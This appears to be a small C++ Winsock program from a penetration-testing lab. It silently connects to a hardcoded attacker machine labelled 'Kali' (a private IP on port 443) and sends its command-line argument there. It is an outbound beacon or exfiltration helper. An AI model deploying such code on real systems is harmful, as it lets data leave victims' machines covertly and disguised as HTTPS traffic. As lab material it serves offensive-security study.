#include <iostream>
#include <winsock2.h>
#include <ws2tcpip.h>

// Link with Ws2_32.lib
#pragma comment(lib, "Ws2_32.lib")

// CONFIGURATION
const char* KALI_IP = "192.168.103.248";
const int KALI_PORT = 443;

int main(int argc, char* argv[]) {
	// 1. Validation: Ensure an argument (keyword) was passed
	if (argc < 2) {
		return 1;
	}

	const char* keyword = argv[1];

	// 2. Initialize Winsock
	WSADATA wsaData;
	if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
		return 1;
	}

	// 3. Create Socket
	SOCKET ConnectSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (ConnectSocket == INVALID_SOCKET) {
		WSACleanup();
		return 1;
	}

	// 4. Set up destination (Kali)
	sockaddr_in clientService;
	clientService.sin_family = AF_INET;
	// FIXED: Use inet_pton for VS2019 compatibility
	inet_pton(AF_INET, KALI_IP, &clientService.sin_addr);
	clientService.sin_port = htons(KALI_PORT);

	// 5. Connect
	if (connect(ConnectSocket, (SOCKADDR*)&clientService, sizeof(clientService)) == SOCKET_ERROR) {
		closesocket(ConnectSocket);
		WSACleanup();
		return 1;
	}

	// 6. Send the Keyword
	send(ConnectSocket, keyword, (int)strlen(keyword), 0);

	// 7. Cleanup
	closesocket(ConnectSocket);
	WSACleanup();

	return 0;
}